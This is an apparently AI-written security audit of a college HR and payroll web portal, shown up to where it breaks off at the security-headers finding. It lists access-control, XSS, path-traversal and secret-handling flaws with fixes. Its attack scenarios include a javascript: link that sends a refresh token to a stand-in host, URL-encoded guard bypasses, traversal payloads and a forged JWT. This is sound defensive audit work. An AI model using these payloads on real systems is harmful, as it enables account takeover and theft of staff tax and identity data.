# Security Audit — GITOFFICE

**Date:** 2026-11-03
**Auditor:** Claude (automated code audit, read-only)
**Commit audited:** `b82321e` (branch `main`, clean working tree)

---

## Executive Summary

GITOFFICE is an HR / establishment portal for a college (staff records, payroll, Form 16, leave, biometric attendance, research activity, Fast-Track courses, tickets, notices). It is a Node.js/Express API (`server/`) on PostgreSQL plus a read-only MySQL biometric database, with a React 18 + Vite client (`client/`).

The code has several good foundations: SQL is parameterized throughout, the register endpoint ignores a client-supplied role, and most role-specific modules (HOD, Principal, Exam Section, Egov, Dean R&D, tickets, leave calendar, research ownership) check roles and ownership correctly.

The main risk is that **anyone who can reach the API can create an account** (`POST /api/auth/register`), and several endpoints only check that the caller is logged in. Together these let an anonymous person:

1. **Read every user's bcrypt password hash** (`GET /api/staff/checkemailid`). Because admin password resets set everyone to the same known password (`Password@123`), the attacker can find and log in to any account still using it, including privileged ones.
2. **Read every staff member's PAN, Aadhaar, phone, date of birth and addresses** (`GET /api/staff`, `/api/staff/:id`, `/api/staff/filter`).
3. **Read any staff member's salary, TDS, loans, LIC, tax regime and Form 16 list** by URL-encoding the staff id, which bypasses the staff access guard (confirmed with a local Express test).
4. **Edit or delete coordinator definitions**, which decide who counts as a FASTRACK coordinator.

There is also a **stored XSS** in the activity reports. A teacher can save a `javascript:` web-link that runs in an HOD's, Egov admin's or Dean R&D's browser when clicked, and the session tokens it can steal are kept in `localStorage`.

**Overall risk rating: CRITICAL.** Fix the four Quick Wins below before this is exposed to any network you don't fully control.

---

## Scope

| Area | Covered |
|---|---|
| `server/src/**` (app bootstrap, config, 50+ route files, middlewares, controllers, services, models, policies, jobs) | Yes |
| `server/database/**` (migrations, seed, schema dump) | Yes (the schema dump contains no data rows) |
| `client/src/**` (API client, auth context, routing, rendering of user-controlled links/HTML) | Yes |
| `server/.env` (key names and secret strength only; values were not copied into this report) | Yes |
| Git history (secret search over all commits) | Yes: `.env` was never committed. Only placeholder values appear in docs. |
| Dependencies (`npm audit --omit=dev` at the workspace root) | Yes |
| Runtime / infrastructure (reverse proxy, TLS, PM2, firewall, VPS) | **No**, because nothing in the repo describes it. Findings that depend on deployment are marked POTENTIAL. |
| Dynamic testing against a live DB | **No**. One guard-bypass behaviour was confirmed by running the guard logic in an isolated Express 4.22.1 app, with no database. |

**Stack:** Node.js, Express 4.22.1, `pg`, `mysql2`, `jsonwebtoken` 9, `bcryptjs`, `multer` 1.4.5-lts.2, `adm-zip`, `node-unrar-js`, `xlsx` 0.18.5, `exceljs`, `nodemailer`, `node-cron`. Client: React 18.3.1, react-router-dom 6, axios, Vite 5.

**Attack surface:** about 300 REST endpoints under `/api/*`, static file serving under `/uploads` and the legacy photo prefix, multipart uploads (Form 16 PDF/ZIP/RAR, research and activity PDFs, ticket attachments, profile JPGs, Excel imports), JWT bearer auth with refresh tokens, password reset by email, Super Admin impersonation, and scheduled cron jobs.

---

## Findings Overview (Critical/High first)

| # | Vulnerability | Severity | Status |
|---|---|---|---|
| C-1 | Password hashes of any user disclosed by `GET /api/staff/checkemailid` | CRITICAL | CONFIRMED |
| C-2 | All staff PII (PAN, Aadhaar, phone, DOB, addresses) readable by any logged-in account | CRITICAL | CONFIRMED |
| C-3 | Staff access guard bypass via URL-encoded id or path case → any staff's salary/TDS/loans/Form 16 | CRITICAL | CONFIRMED |
| H-1 | Open self-registration gives anonymous users an authenticated session | HIGH | CONFIRMED |
| H-2 | Coordinator create/update/delete has no authorization check | HIGH | CONFIRMED |
| H-3 | Stored XSS via `javascript:` web-links in research records | HIGH | CONFIRMED |
| M-1 | Biometric attendance for all staff readable by any logged-in account | MEDIUM | CONFIRMED |
| M-2 | `/uploads` (Form 16 tax PDFs, research docs, ticket attachments) served without authentication | MEDIUM | CONFIRMED |
| M-3 | Unrestricted upload file types → HTML/SVG served from the API origin | MEDIUM | CONFIRMED (impact POTENTIAL) |
| M-4 | Inactive accounts can still log in | MEDIUM | CONFIRMED |
| M-5 | Admin password reset sets a fixed, publicly known default password | MEDIUM | CONFIRMED |
| M-6 | No rate limiting or lockout on login / forgot-password / verify-password | MEDIUM | CONFIRMED |
| M-7 | Path traversal in Form 16 upload destination and delete (Establishment role) | MEDIUM | CONFIRMED |
| M-8 | Password reset token embeds the bcrypt hash and shares the access-token secret | MEDIUM | CONFIRMED |
| L-1 | Hard-coded JWT fallback secret `supersecret`; current secrets follow a placeholder pattern | LOW | CONFIRMED / POTENTIAL |
| L-2 | Raw internal error messages returned to clients | LOW | CONFIRMED |
| L-3 | Ticket uploads have no size limit at the parser; rejected files stay on disk | LOW | CONFIRMED |
| L-4 | Missing security headers (no helmet, `X-Powered-By` exposed, no CSP / frame protection) | LOW | CONFIRMED |
| L-5 | Session tokens in `localStorage`; 7-day refresh tokens with no server-side revocation | LOW | CONFIRMED |
| L-6 | New MySQL pool created per biometric request (resource exhaustion) | LOW | CONFIRMED |
| I-1 | CORS accepts any private-network origin when `NODE_ENV` ≠ production (current `.env` is `development`) | INFORMATIONAL | CONFIRMED |
| I-2 | Biometric MySQL is reached over a public IP | INFORMATIONAL | POTENTIAL |
| I-3 | Vulnerable dependencies (2 critical, 9 high, 17 moderate) | see Dependency Review | CONFIRMED |

---

## Detailed Findings

### C-1. Password hash disclosure via `GET /api/staff/checkemailid`

| Field | Description |
|---|---|
| **Vulnerability** | Excessive data exposure: bcrypt password hash of any user returned by the email-availability check |
| **Severity** | CRITICAL |
| **Location** | `server/src/controllers/establishment/staff.controller.js:35-46`, `server/src/models/user.model.js:15-28`, `server/src/routes/staff.routes.js:23`, `server/src/middlewares/staffAccess.middleware.js:46-56` |
| **Description** | The endpoint is meant to tell the Establishment "add staff" form whether an email is taken. It returns the full row from `userModel.findByEmail()`, which selects `u.password` (the bcrypt hash), role and status. The only guard is `staffRecordGuard`, and it lets every GET that isn't a `/:id/<sub-record>` path through for any logged-in user. |
| **Evidence** | `user.model.js:17` → `SELECT u.id, u.email, u.password, u.role, u.status, ...`<br>`staff.controller.js:39-42` → `const email = current.includes('@') ? current : \`${current}@git.edu\`; const found = await userModel.findByEmail(email); ... return res.json([found]);`<br>`staffAccess.middleware.js:54-55` → `const subRecord = req.path.match(/^\/(\d+)\/.+/); if (!subRecord) return next();` (`/checkemailid` is not a sub-record path, so the request is allowed) |
| **Attack Scenario** | 1. Attacker registers an account (H-1) and logs in.<br>2. Calls `GET /api/staff/checkemailid?current_email=principal` (the `@git.edu` suffix is added automatically) for guessed or harvested usernames. C-2 also returns every staff email.<br>3. Receives `password: "$2a$10$..."` for each account.<br>4. Runs `bcrypt.compare('Password@123', hash)` (see M-5) and a common-password list offline. Any match gives a working login. Super Admin accounts allow impersonating anyone. |
| **Impact** | Takeover of any account with a weak or default password, including Super Admin / Establishment, and through them full read/write of payroll, staff and leave data. |
| **Likelihood** | HIGH: one GET request after self-registration, and the default password is in the source code. |
| **Recommended Fix** | 1. Return only a boolean: `return res.json({ exists: Boolean(found) });` and update `client/src/pages/establishment/Staff.jsx:394`.<br>2. Restrict the route to Establishment: `router.get('/checkemailid', requireEstb, staffController.checkEmail);`<br>3. Defence in depth: add a separate `findAuthByEmail()` that selects `password` and is used only by login/reset; make `findByEmail()` never select `password`. |
| **Status** | CONFIRMED (code trace) |

---

### C-2. All staff PII readable by any authenticated account

| Field | Description |
|---|---|
| **Vulnerability** | Broken access control / excessive data exposure on `GET /api/staff`, `GET /api/staff/:id`, `GET /api/staff/filter` |
| **Severity** | CRITICAL (because H-1 lets anyone obtain an account) |
| **Location** | `server/src/routes/staff.routes.js:27,29,46`; `server/src/services/staff.service.js:4` (`filterStaff`), `:115` (`listAll`), `:367` (`getById`); `server/src/middlewares/staffAccess.middleware.js:43-56`; columns in `server/database/migrations/099_create_staff.sql` |
| **Description** | `staffRecordGuard` deliberately lets any signed-in user read the staff list and profiles ("other portals rely on it"). The queries use `SELECT *` / `SELECT s.*`, which returns sensitive columns: `pan_card`, `adhar_card`, `contactno`, `emergency_no`, `dob`, `local_address`, `permanent_address`, religion/caste ids and email. No role is required, so a self-registered `user` gets the whole directory. |
| **Evidence** | `staff.service.js:115` → `` const sql = `SELECT * FROM staff ORDER BY created_at DESC, id DESC`; ``<br>`staff.service.js:367` → `SELECT s.*, u.email, ...`<br>`staffAccess.middleware.js:54-55` → non-sub-record GETs call `next()` for every authenticated user. |
| **Attack Scenario** | 1. Register and log in (H-1).<br>2. `GET /api/staff` → JSON array containing PAN, Aadhaar, phone, DOB and addresses for every employee. |
| **Impact** | Bulk leak of national identifiers (PAN/Aadhaar) and contact data for all staff, which enables identity fraud and targeted phishing. Likely a reportable breach under India's DPDP Act 2023. |
| **Likelihood** | HIGH: one request. |
| **Recommended Fix** | 1. Close self-registration (H-1).<br>2. Split responses: a "directory" projection (`id, fname, mname, lname, department, designation`) for general roles, and the full record only for `ESTB_READ_ROLES` or the staff member themselves. Replace `SELECT *` / `s.*` with explicit column lists.<br>3. In `staffRecordGuard`, deny the `user` role (and any role not in a known allowlist) for all `/api/staff` reads. |
| **Status** | CONFIRMED (code trace) |

---

### C-3. Staff access guard bypass (URL-encoded id / path case / trailing slash)

| Field | Description |
|---|---|
| **Vulnerability** | Authorization bypass in `staffRecordGuard`: it checks the raw `req.path`, while Express routes on the decoded, case-insensitive path |
| **Severity** | CRITICAL (with H-1); HIGH on its own |
| **Location** | `server/src/middlewares/staffAccess.middleware.js:52-58`; affects every sub-router mounted in `server/src/routes/staff.routes.js:31-43` (salaries, TDS, TDS export, remunerations, festival advances, society loans/shares, laptop loans, LIC + transactions, tax regimes, designation/payscale, annual increments, departments, institutions, associations, leaves, Form 16 list) |
| **Description** | The guard decides whether a GET targets a staff sub-record with `req.path.match(/^\/(\d+)\/.+/)`. `req.path` is **not** percent-decoded, but Express decodes route params. So `/%31%32/salaries` fails the regex (and is treated as a harmless list path), while the router still matches `/:id/salaries` with `id = "12"`. Likewise `ESTB_ONLY_READ_PATHS.includes(req.path)` is an exact-string check, but Express routing is case-insensitive and ignores a trailing slash. |
| **Evidence** | Isolated reproduction using the same guard logic and Express 4.22.1 from this repo (no DB), as a non-privileged user with staff id 5:<br>`/api/staff/12/salaries -> 403`<br>`/api/staff/%31%32/salaries -> 200 salaries of staff 12`<br>`/api/staff/getstaffpay_list -> 403`<br>`/api/staff/GetStaffPay_List -> 200`<br>`/api/staff/getstaffpay_list/ -> 200` |
| **Attack Scenario** | 1. Log in as any user (self-registered, or any teaching staff).<br>2. `GET /api/staff/%31%32/salaries`, `/api/staff/%31%32/tds`, `/api/staff/%31%32/tds/export`, `/api/staff/%31%32/form-16`, and so on, for every id.<br>3. Collect payroll, tax and loan data for the whole institution. The Form 16 listing also discloses file URLs, which are publicly downloadable (M-2). |
| **Impact** | Confidential salary, tax, loan and insurance data for every employee. Write methods are still blocked (the guard denies all non-GET requests from non-Establishment users). |
| **Likelihood** | HIGH: trivial to try, and works with any account. |
| **Recommended Fix** | Do the check on route params, not on path strings. For example, in each staff sub-router add `router.param('id', ownStaffOrPrivileged)` (Express decodes `id` before calling it), or apply a middleware like `router.use('/:id/*', checkOwner)` that compares `Number(req.params.id)`. For the deny-list, use a dedicated route: `router.get('/getstaffpay_list', requireEstb, ...)`. Default-deny: if a GET path is not on an explicit allowlist for non-privileged users, return 403. Add regression tests for `%31`-style encoding, uppercase paths and trailing slashes in `server/tests/auth-access.test.js`. |
| **Status** | CONFIRMED (reproduced locally) |

---

### H-1. Open self-registration

| Field | Description |
|---|---|
| **Vulnerability** | Business-logic flaw: unauthenticated account creation in an internal HR system |
| **Severity** | HIGH (this is what turns C-1, C-2, C-3, H-2 and M-1 from "insider" into "anyone") |
| **Location** | `server/src/routes/auth.routes.js:13`; `server/src/services/auth.service.js:64-80`; `server/src/validations/auth.validation.js:11-19`; client route `client/src/routes/AppRoutes.jsx:178` |
| **Description** | `POST /api/auth/register` creates an `Active` user with role `user` for any email. There is no invitation, email verification, domain restriction or password policy. The role is correctly forced to `user`, but many endpoints only check `authMiddleware`, so that role still has wide read access. |
| **Evidence** | `auth.service.js:75-79` → `userModel.create({ email: payload.email, passwordHash, role: 'user' })`; `user.model.js:76` inserts with `status 'Active'`; the validator only checks presence of `name, email, password`. |
| **Attack Scenario** | `curl -X POST /api/auth/register -d '{"name":"x","email":"x@x.com","password":"x"}'` then `/api/auth/login` → bearer token. |
| **Impact** | Anonymous users gain authenticated access; see C-1, C-2, C-3, H-2, M-1, M-3. |
| **Likelihood** | HIGH |
| **Recommended Fix** | Remove the public route if accounts are created by Establishment (as the "add staff" flow suggests). Otherwise require an invitation or email verification restricted to `@git.edu`, create accounts as `inactive` until approved, and enforce a password policy (min 8+ characters). Also make `roleMiddleware` default-deny the `user` role on data endpoints. |
| **Status** | CONFIRMED |

---

### H-2. Coordinator CRUD with no authorization

| Field | Description |
|---|---|
| **Vulnerability** | Missing function-level access control on `/api/coordinators` |
| **Severity** | HIGH |
| **Location** | `server/src/routes/coordinator.routes.js:7-11`; `server/src/controllers/super-admin/coordinator.controller.js:22-55`; `server/src/models/coordinator.model.js:20,42,50`; used for privilege decisions in `server/src/models/teaching/fastrackStaff.model.js:16-24` |
| **Description** | `POST`, `PUT /:id` and `DELETE /:id` only require login, but this is a Super Admin feature (`pages/super-admin/Coordinators.jsx`). Coordinator **names** are used for authorization: `isCoordinator()` grants FASTRACK coordinator powers when the staff member belongs to a coordinator whose `name = 'FASTRACK'`. |
| **Evidence** | `router.post('/', authMiddleware, coordinatorController.create); router.put('/:id', authMiddleware, ...update); router.delete('/:id', authMiddleware, ...remove);` with no role check in the controller or service.<br>`fastrackStaff.model.js:21-23` → `... WHERE cs.staff_id = $1 AND c.name = 'FASTRACK' AND cs.status = 'active'` |
| **Attack Scenario** | 1. A teaching staff member who is an active member of any other coordinator group calls `PUT /api/coordinators/<thatGroupId>` with `{"name":"FASTRACK"}`.<br>2. They now pass `isCoord` checks under `/api/teaching/fastrack/coordinator/*` and `/verification/*`, so they can assign staff and verify Fast-Track records (which feed `fastrack_pays`) for their department.<br>Or any account (including self-registered) can `DELETE` the FASTRACK coordinator and break the module for everyone. |
| **Impact** | Privilege escalation inside the Fast-Track pay workflow, integrity loss, denial of service. |
| **Likelihood** | MEDIUM: the escalation needs existing coordinator-group membership; tampering or deletion needs only a login. |
| **Recommended Fix** | `router.post('/', authMiddleware, roleMiddleware('Super Admin','super-admin','admin'), ...)` (same for PUT/DELETE). Consider authorizing on a stable coordinator id or code rather than an editable `name`. |
| **Status** | CONFIRMED (missing check); escalation path depends on data |

---

### H-3. Stored XSS via `javascript:` URLs in research web-links

| Field | Description |
|---|---|
| **Vulnerability** | Stored DOM XSS |
| **Severity** | HIGH |
| **Location** | Sink: `client/src/pages/activityReports/DepartmentActivityReport.jsx:240-245`, `client/src/pages/staff/research/ResearchModule.jsx:430-436`. Source: `server/src/controllers/common/research.controller.js:38-41,199,229` (`weblink`, `link` stored as-is). Report columns: `client/src/pages/activityReports/reportConfig.js:143,166,190` |
| **Description** | Teaching staff can save any string as `weblink` / `link` on conference, publication and similar records. The server only trims it. The client renders it as `<a href={row[column.key]}>`. React 18.3.1 (the installed version) only logs a warning for `javascript:` URLs and still renders them. The department activity report shows these links to HOD, Egov admin and Dean R&D users, and session tokens are stored in `localStorage` (L-5). |
| **Evidence** | `<a href={row[column.key]} target="_blank" rel="noreferrer" ...>{row[column.key]}</a>`; `readString()` returns `value.trim()` with no scheme validation. |
| **Attack Scenario** | 1. A teacher creates a publication with `link = javascript:fetch('https://evil/x?'+localStorage.refreshToken)`.<br>2. The HOD opens the department activity report and clicks the "Web-Link".<br>3. The attacker gets the HOD's 7-day refresh token and acts as the HOD (approving leave, editing applications, and so on). |
| **Impact** | Session hijack of higher-privileged reviewers. |
| **Likelihood** | MEDIUM: needs a teaching account and a click, but the link looks normal in the table. |
| **Recommended Fix** | Server: reject anything that doesn't parse as `http:` / `https:` (`const u = new URL(v); if (!['http:','https:'].includes(u.protocol)) error`). Client: add a `safeHref()` helper that returns `undefined` for non-http(s) URLs and use it at every `href={userValue}`. Longer term, upgrade to React 19 (which blocks `javascript:` URLs) and add a CSP. |
| **Status** | CONFIRMED |

---

### M-1. Biometric attendance of all staff exposed to any logged-in account

| Field | Description |
|---|---|
| **Vulnerability** | Broken access control on `/api/biometric/daily`, `/monthly`, `/muster` |
| **Severity** | MEDIUM |
| **Location** | `server/src/routes/biometric.routes.js:7-9`; `server/src/controllers/biometric.controller.js:9-46` |
| **Description** | These endpoints only require login. `daily` returns punch logs for all staff (optionally filtered by department), `muster` returns the whole month for everyone, and `monthly?employee=<code>` returns any employee's logs. No role or ownership check is applied. |
| **Evidence** | `router.get('/daily', authMiddleware, daily); router.get('/monthly', authMiddleware, monthly); router.get('/muster', authMiddleware, muster);` and the controller passes `req.query.employee` straight to `getMonthlyForEmployee(emp, ...)`. |
| **Attack Scenario** | Self-registered user → `GET /api/biometric/muster?month=10&year=2026` → in/out times for every employee. |
| **Impact** | Privacy leak of location and attendance patterns. It also enables physical-security profiling. |
| **Likelihood** | HIGH |
| **Recommended Fix** | Restrict `daily` and `muster` to Establishment / Principal / Registrar / Super Admin (and HOD scoped to their department, as `monthlySummaryForHod` already does). For `monthly`, allow only the caller's own employee code unless the role is privileged. |
| **Status** | CONFIRMED |

---

### M-2. Uploaded documents served publicly without authentication

| Field | Description |
|---|---|
| **Vulnerability** | Missing authorization on static file serving |
| **Severity** | MEDIUM |
| **Location** | `server/src/app.js:50` (`/uploads`), `:53` (legacy photo dir); file naming in `server/src/controllers/establishment/staffForm16.controller.js:40-46,169-177`, `server/src/middlewares/upload.middleware.js:28-45` |
| **Description** | Everything under `server/uploads` is served by `express.static` with no auth: Form 16 tax certificates (`/uploads/form16/<staffId>/<year>/part-a|part-b/<Date.now()>_<PAN...>.pdf`), research and activity PDFs, ticket attachments and profile photos. Research and ticket names are random, but Form 16 names are a timestamp plus the original file name (bulk uploads are named after the PAN), and they are disclosed by the `/api/staff/:id/form-16` listing, which C-3 lets anyone read. |
| **Evidence** | `app.use('/uploads', express.static(path.resolve(__dirname, '..', 'uploads')));`<br>`sanitizeFileName()` → `` `${Date.now()}_${base}${ext}` `` with `base` taken from `PAN....pdf` |
| **Attack Scenario** | Use C-3 to list `/api/staff/%3123/form-16` → get `file_url` → download the Form 16 with no token. URLs also leak through browser history, proxies and forwarded links, and stay valid forever. |
| **Impact** | Disclosure of tax documents (income, PAN, employer TAN). |
| **Likelihood** | MEDIUM |
| **Recommended Fix** | Move sensitive files (at least `form16/`, ticket `attachment/`) out of the static root. Serve them through an authenticated route (`GET /api/staff/:id/form-16/:fileId/download`) that applies the same owner/role check and uses `res.sendFile` with a resolved path verified to be inside the root. Alternatively, issue short-lived signed URLs. |
| **Status** | CONFIRMED |

---

### M-3. Unrestricted upload file types (HTML served from API origin)

| Field | Description |
|---|---|
| **Vulnerability** | Unrestricted file upload / stored XSS on the API origin |
| **Severity** | MEDIUM |
| **Location** | `server/src/routes/tickets.routes.js:24-37` (any extension, any logged-in user); `server/src/middlewares/upload.middleware.js:38,50-58,91-99` (PDF filter accepts on MIME **or** name, and keeps the original extension) |
| **Description** | Ticket attachments keep whatever extension the client sends (`.html`, `.svg`, …). `pdfOnlyFilter` accepts a file if `mimetype === 'application/pdf'` (client-controlled) **or** the name ends in `.pdf`, then saves it with the original name's extension. So `evil.html` sent with `Content-Type: application/pdf` is stored as `<random>.html`. `express.static` serves it as `text/html` from the API origin. |
| **Evidence** | Tickets: `const ext = path.extname(file.originalname || '').toLowerCase(); const safeExt = ext \|\| '.bin';` and no `fileFilter`. PDF filter: `if (isPdfMime \|\| isPdfName) cb(null, true)` then `const ext = path.extname(file.originalname ...) \|\| '.pdf'`. |
| **Attack Scenario** | A user attaches `x.html` to a support ticket. The Super Admin opens the attachment link and attacker-controlled HTML/JS runs on `http://<host>:3004`. With the current split (client on :3003, API on :3004) it cannot read the client's `localStorage`, but it can host convincing phishing pages on the trusted host. If production puts client and API behind one origin (common with a reverse proxy), it becomes full token theft. |
| **Impact** | Phishing on the trusted domain, with possible session theft depending on deployment. |
| **Likelihood** | MEDIUM |
| **Recommended Fix** | Allowlist extensions and force the stored extension (`.pdf` for PDF uploads; a fixed list such as `.pdf,.png,.jpg,.docx` for tickets). Require **both** MIME and extension, and check magic bytes (`%PDF-`). Serve uploads with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` (`express.static(root, { setHeaders })`), or from a separate cookieless domain. |
| **Status** | CONFIRMED (upload behaviour); impact POTENTIAL (depends on deployment origin) |

---

### M-4. Inactive accounts can still log in

| Field | Description |
|---|---|
| **Vulnerability** | Broken authentication: account status not enforced |
| **Severity** | MEDIUM |
| **Location** | `server/src/services/auth.service.js:82-98` (login), `:100-124` (refresh); schema `server/database/migrations/121_create_users.sql` (`status IN ('active','inactive')`) |
| **Description** | `findByEmail` selects `u.status`, but neither `login()` nor `refreshSession()` checks it. Deactivated (departed or suspended) users keep full access, and existing refresh tokens keep renewing for 7-day windows. |
| **Evidence** | `login()` only checks that the user exists and `comparePassword`; no `status` comparison anywhere in `auth.service.js`. |
| **Attack Scenario** | An employee who left is marked `inactive` but logs in as usual and keeps reading or changing data. |
| **Impact** | Offboarding is ineffective. |
| **Likelihood** | MEDIUM |
| **Recommended Fix** | In `login()` and `refreshSession()`: `if (String(user.status).toLowerCase() !== 'active') throw 401/403`. Consider also checking status in `authMiddleware` (cached) so access tokens stop working within their 15-minute lifetime. |
| **Status** | CONFIRMED |

---

### M-5. Fixed default password on admin reset

| Field | Description |
|---|---|
| **Vulnerability** | Weak credential management |
| **Severity** | MEDIUM (it is the key enabler for exploiting C-1) |
| **Location** | `server/src/services/user.service.js:5,37-43`; `server/src/controllers/common/user.controller.js:50-63` |
| **Description** | `POST /api/users/:id/reset-password` sets the password to the hard-coded `Password@123`, returns it in the response, and nothing forces a change at next login. Every reset account shares one password that is public in the source code. |
| **Evidence** | `const DEFAULT_RESET_PASSWORD = 'Password@123';` and `message: \`Password reset successfully to ${data.defaultPassword}\`` |
| **Attack Scenario** | Anyone (or C-1 hash checks) tries `Password@123` against accounts. Every account an admin has reset and the user hasn't changed opens immediately. |
| **Impact** | Account takeover. |
| **Likelihood** | HIGH, given there is no rate limiting (M-6). |
| **Recommended Fix** | Generate a random one-time password (`crypto.randomBytes(9).toString('base64url')`) or, better, send a reset link through the existing email flow. Add a `must_change_password` flag enforced at login. |
| **Status** | CONFIRMED |

---

### M-6. No rate limiting / lockout on authentication endpoints

| Field | Description |
|---|---|
| **Vulnerability** | Missing anti-automation |
| **Severity** | MEDIUM |
| **Location** | `server/src/routes/auth.routes.js:13-17`; `server/src/routes/user.routes.js:13-14` (`/me/verify-password`); `server/src/app.js` (no limiter); no limiter dependency in `server/package.json` |
| **Description** | Login, register, forgot-password and verify-password accept unlimited attempts. Forgot-password sends an email each time (email bombing / SMTP reputation). |
| **Evidence** | No `express-rate-limit`, or equivalent, anywhere in `server/src`. |
| **Attack Scenario** | Credential stuffing against `/api/auth/login` with `Password@123` and common passwords across all staff emails (harvested via C-2). |
| **Impact** | Account takeover, mail abuse. |
| **Likelihood** | HIGH |
| **Recommended Fix** | Add `express-rate-limit` (for example 10 per 15 minutes per IP+email on login, 3 per hour per email on forgot-password) and progressive lockout. If behind a proxy, set `app.set('trust proxy', 1)` correctly so limits key on the real IP. |
| **Status** | CONFIRMED |

---

### M-7. Path traversal in Form 16 upload destination and delete

| Field | Description |
|---|---|
| **Vulnerability** | Path traversal leading to arbitrary file write and delete |
| **Severity** | MEDIUM (requires the Establishment role) |
| **Location** | Write: `server/src/middlewares/upload.middleware.js:26-35` (destination uses raw `req.params.id` and `req.body.year`); delete: `server/src/controllers/establishment/staffForm16.controller.js:27-33,243-262` |
| **Description** | **Upload:** multer's destination builds `path.join(form16Root, req.params.id, req.body.year)` **before** the controller validates `year` with `toYear()`. Express decodes `%2F` in `:id`, and `year` is any multipart field, so `../../..` sequences let the folder escape `uploads/form16`. Combined with M-3 (extension kept), this writes attacker-named `.html`/`.js` files to arbitrary directories (with a timestamp prefix). **Delete:** `fileId` is base64 of `staffId|year|fileName`. Only `staffId` is checked, so `fileName = ../../../../src/app.js` deletes arbitrary files the process can write. |
| **Evidence** | `const year = String(req.body.year \|\| '').trim(); const yearDir = path.join(staffDir, year \|\| 'unknown'); ensureDir(yearDir);`<br>`const filePath = path.join(getStaffRoot(staffId), String(decoded.year), String(decoded.fileName)); ... fs.unlinkSync(filePath);` |
| **Attack Scenario** | A compromised or malicious Establishment account (or one taken over via C-1/M-5) sends `DELETE /api/staff/1/form-16/<base64("1|2024|../../../../src/server.js")>`, and the server fails on its next restart. Or it uploads `year=../../../../client-dist` with `x.html` to plant content. |
| **Impact** | Integrity and availability of the server, and a possible stepping stone to code execution if a written file is later loaded. |
| **Likelihood** | LOW–MEDIUM (privileged role required) |
| **Recommended Fix** | In destination: `const staffId = Number(req.params.id); const year = toYear(req.body.year); if (!staffId \|\| !year) return cb(new Error('Invalid'))`. In remove (and anywhere else paths are built): `const p = path.resolve(root, ...); if (!p.startsWith(root + path.sep)) return 400;` and require `path.basename(fileName) === fileName` plus a `.pdf` extension. |
| **Status** | CONFIRMED (code trace) |

---

### M-8. Password reset token leaks the bcrypt hash and shares the access-token secret

| Field | Description |
|---|---|
| **Vulnerability** | Sensitive data in tokens / token type confusion |
| **Severity** | MEDIUM |
| **Location** | `server/src/services/auth.service.js:148-157,159-190`; `server/src/config/index.js:20`; `server/src/utils/jwt.js:31-37`; `server/src/middlewares/auth.middleware.js:13-15` |
| **Description** | (a) The reset JWT payload contains `passwordHash: user.password`. JWTs are only signed, not encrypted, so the hash is readable by anyone who sees the link (mail servers, browser history, proxy/referrer logs). (b) `PASSWORD_RESET_SECRET` is not set in `.env`, so reset tokens are signed with `JWT_SECRET` and `authMiddleware` accepts them as bearer access tokens for 30 minutes. No token-type (`typ`/`aud`) claim exists to stop this. |
| **Evidence** | `signPasswordResetToken({ id: user.id, email: user.email, passwordHash: user.password })`; `passwordResetSecret: process.env.PASSWORD_RESET_SECRET \|\| process.env.JWT_SECRET \|\| 'supersecret'`; `.env` has no `PASSWORD_RESET_SECRET`. |
| **Attack Scenario** | A reset link that is forwarded or logged reveals the user's bcrypt hash for offline cracking. The same token can also call `GET /api/staff` and similar endpoints as that user. |
| **Impact** | Password hash exposure, unintended authentication. |
| **Likelihood** | LOW–MEDIUM |
| **Recommended Fix** | Put a non-reversible marker in the token instead (for example the existing `passwordVersion()` 16-character SHA-256 prefix). Add `typ: 'access' \| 'refresh' \| 'reset'` claims (or `audience`) and verify them in each `verify*` function. Set distinct secrets for access, refresh and reset tokens, and fail startup if any is missing. |
| **Status** | CONFIRMED |

---

### L-1. Hard-coded JWT fallback secret

| Field | Description |
|---|---|
| **Vulnerability** | Hard-coded secret fallback |
| **Severity** | LOW (MEDIUM if the env var is ever missing in production) |
| **Location** | `server/src/config/index.js:16,20`; `server/src/utils/jwt.js:15-17,27` |
| **Description** | If `JWT_SECRET` is unset, tokens are signed with `supersecret`, so anyone can forge a Super Admin token. The current `server/.env` values for `JWT_SECRET` and `JWT_REFRESH_SECRET` both begin with `supersecret_`, which looks like a sample value rather than a randomly generated key. (Exact values not reproduced here; the file is git-ignored and was never committed.) |
| **Evidence** | `jwtSecret: process.env.JWT_SECRET \|\| 'supersecret'`. Refresh falls back to the access secret when `JWT_REFRESH_SECRET` is empty. |
| **Attack Scenario** | A deployment without `.env` loaded (wrong cwd or PM2 env) silently accepts `jwt.sign({id:1, role:'Super Admin'}, 'supersecret')`. |
| **Impact** | Full authentication bypass in that configuration. |
| **Likelihood** | LOW |
| **Recommended Fix** | Remove the fallbacks and throw at startup if secrets are missing or shorter than 32 random bytes. Rotate the current secrets to `crypto.randomBytes(48).toString('base64')` values (this logs everyone out once). Pin `algorithms: ['HS256']` in `jwt.verify`. |
| **Status** | Fallback CONFIRMED; weakness of current values POTENTIAL |

### L-2. Internal error messages returned to clients

| Field | Description |
|---|---|
| **Vulnerability** | Information disclosure through error handling |
| **Severity** | LOW |
| **Location** | `server/src/middlewares/error.middleware.js:1-15`; also `server/src/routes/profile.routes.js:43` |
| **Description** | For 500 errors the handler returns `error.message`, which for `pg`/`mysql2` errors includes table, column and constraint names and SQL fragments. No stack traces are returned. |
| **Evidence** | `message: error.message \|\| 'Internal Server Error'` regardless of status. |
| **Attack Scenario** | Sending malformed input to endpoints reveals schema details that make other attacks easier. |
| **Impact** | Reconnaissance aid. |
| **Likelihood** | MEDIUM |
| **Recommended Fix** | `const message = status >= 500 ? 'Internal Server Error' : error.message;` and log the full error server-side. |
| **Status** | CONFIRMED |

### L-3. Ticket uploads: no size limit at parse time

| Field | Description |
|---|---|
| **Vulnerability** | Resource exhaustion |
| **Severity** | LOW |
| **Location** | `server/src/routes/tickets.routes.js:36-37`; `server/src/services/ticket.service.js:38-46` |
| **Description** | Multer has no `limits.fileSize` for tickets (up to 10 files per request). The 500 KB check runs after the files are already written to disk, and rejected files are not deleted. Any logged-in user (including self-registered) can fill the disk. |
| **Evidence** | `multer({ storage: buildStorage(ticketAttachmentDir) })`; `validateFileSizes` throws but never calls `unlink`. |
| **Attack Scenario** | A loop posting 10 × 1 GB files to `POST /api/tickets` fills the disk. Each request returns 400, but the files remain. |
| **Impact** | Denial of service. |
| **Likelihood** | MEDIUM |
| **Recommended Fix** | `multer({ storage, limits: { fileSize: 500*1024, files: 10 }, fileFilter })` and delete `req.files` on any validation error. Also set limits on `exam-section.routes.js:15` (`multer({ storage: memoryStorage() })` without limits). |
| **Status** | CONFIRMED |

### L-4. Missing security headers

| Field | Description |
|---|---|
| **Vulnerability** | Insecure HTTP headers / clickjacking |
| **Severity** | LOW |
